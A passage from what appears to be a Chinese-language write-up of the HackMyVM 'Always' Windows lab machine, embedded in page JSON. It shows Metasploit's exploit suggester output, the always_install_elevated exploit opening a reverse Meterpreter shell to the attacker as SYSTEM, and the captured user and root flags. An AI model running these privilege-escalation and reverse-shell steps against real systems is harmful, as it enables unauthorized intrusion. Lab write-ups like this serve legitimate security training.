Sending stage (203846 bytes) to 192.168.56.38\n[*] Meterpreter session 1 opened (192.168.56.4:4444 -> 192.168.56.38:49159) at 2025-02-26 02:59:08 -0500\n\nmeterpreter > \n</code></pre>\n<p>使用模块枚举提权方法</p>\n<pre><code class=\"hljs language-bash\">msf6 post(multi/recon/local_exploit_suggester) > run                                                                                                                                                                                \n                                                                                                                                                                                                                                    \n[*] 192.168.56.38 - Collecting <span class=\"hljs-built_in\">local</span> exploits <span class=\"hljs-keyword\">for</span> x64/windows...                                                                                                                                                                    \n[*] 192.168.56.38 - 198 exploit checks are being tried...                                                                                                                                                                           \n[+] 192.168.56.38 - exploit/windows/local/always_install_elevated: The target is vulnerable.                                                                                                                                        \n[+] 192.168.56.38 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.                                                                                                                                 \n[+] 192.168.56.38 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.                                                                                                                                  \n[+] 192.168.56.38 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.                                                                                                                           \n[+] 192.168.56.38 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!\n[+] 192.168.56.38 - exploit/windows/local/cve_2020_1054_drawiconex_lpe: The target appears to be vulnerable.                                                                                                                        \n[+] 192.168.56.38 - exploit/windows/local/cve_2021_40449: The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!                               \n[+] 192.168.56.38 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.        \n[+] 192.168.56.38 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.                                                                                                                           \n[+] 192.168.56.38 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.                                                                                                                          \n[+] 192.168.56.38 - exploit/windows/local/ms15_078_atmfd_bof: The service is running, but could not be validated.                                                                                                                   \n[+] 192.168.56.38 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.                                                                                                                             \n[+] 192.168.56.38 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.                                                                                                                                          \n[+] 192.168.56.38 - exploit/windows/local/virtual_box_opengl_escape: The service is running, but could not be validated.                                                \n[*] Running check method <span class=\"hljs-keyword\">for</span> exploit 47 / 47                                                                                                                                                                                        \n[*] 192.168.56.38 - Valid modules <span class=\"hljs-keyword\">for</span> session 1:                                                                                                                                                                                    \n============================                                                                                                                                                                                                        \n                                                                                                                                                                                                                                    \n <span class=\"hljs-comment\">#   Name                                                           Potentially Vulnerable?  Check Result                                                                                                                           </span>\n -   ----                                                           -----------------------  ------------                                                                                                                           \n 1   exploit/windows/local/always_install_elevated                  Yes                      The target is vulnerable.                                     \n 2   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.                             \n 3   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.\n 4   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.\n 5   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!\n 6   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerable.\n 7   exploit/windows/local/cve_2021_40449                           Yes \n......\n</code></pre>\n<p>使用模块枚举出来的第一个模块来提权</p>\n<pre><code class=\"hljs language-bash\">msf6 exploit(windows/local/always_install_elevated) > <span class=\"hljs-built_in\">set</span> lhost 192.168.56.4\nlhost => 192.168.56.4\nmsf6 exploit(windows/local/always_install_elevated) > <span class=\"hljs-built_in\">set</span> lport 1234\nlport => 1234\nmsf6 exploit(windows/local/always_install_elevated) > <span class=\"hljs-built_in\">set</span> session 1\nsession => 1\nmsf6 exploit(windows/local/always_install_elevated) > run\n\n[*] Started reverse TCP handler on 192.168.56.4:1234 \n[*] Uploading the MSI to C:\\Users\\ftpuser\\AppData\\Local\\Temp\\vPVgqPs.msi ...\n[*] Executing MSI...\n[*] Sending stage (177734 bytes) to 192.168.56.38\n[+] Deleted C:\\Users\\ftpuser\\AppData\\Local\\Temp\\vPVgqPs.msi\n[*] Meterpreter session 2 opened (192.168.56.4:1234 -> 192.168.56.38:49161) at 2025-02-26 03:34:18 -0500\n\nmeterpreter > \nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre>\n<h2>UserFlag &#x26; RootFlag</h2>\n<pre><code class=\"hljs language-bash\">C:\\Users\\Always\\Desktop><span class=\"hljs-built_in\">type</span> user.txt\n<span class=\"hljs-built_in\">type</span> user.txt\nHMV{You_Found_Me!}\n</code></pre>\n<pre><code class=\"hljs language-bash\">C:\\Users\\Administrator\\Desktop><span class=\"hljs-built_in\">type</span> root.txt\n<span class=\"hljs-built_in\">type</span> root.txt\nHMV{White_Flag_Raised}\n</code></pre>","title":"HackMyVM  -  Always","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"Always.\n\n https://hackmyvm.eu/machines/machine.php?vm=Always\n \n\nNotes: Beginner friendly, easy windows box. Basic enumeration skills and windows privilege escalation knowledge will open your way.\n\n前期踩..."},"recentPosts":[{"id":"TheHackersLabsShadowGate","title":"TheHackersLabs - ShadowGate","date":"2025-08-06","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"HackTheBoxSeason7-Code","title":"HackTheBox - Machine - Code","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"TheHackersLabsOfusPingu","title":"TheHackersLabs - OfusPingu","date":"2025-08-05","isEncrypted":false,"year":"2025","month":"08","day":"05"},{"id":"TheHackersLabsDoraemon","title":"TheHackersLabs - Doraemon","date":"2025-08-03","isEncrypted":false,"year":"2025","month":"08","day":"03"},{"id":"HackTheBoxSeason8 - Editor","title":"HackTheBox - Season8 - Editor","date":"2025-08-03","isEncrypted":true,"year":"2025","month":"08","day":"03"},{"id":"TheHackersLabsHellRoot","title":"TheHackersLabs - HellRoot","date":"2025-08-02","isEncrypted":false,"year":"2025","month":"08","day":"02"},{"id":"群U靶机 - Cliv2","title":"群U靶机 - Cliv2","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"}]},"__N_SSG":true}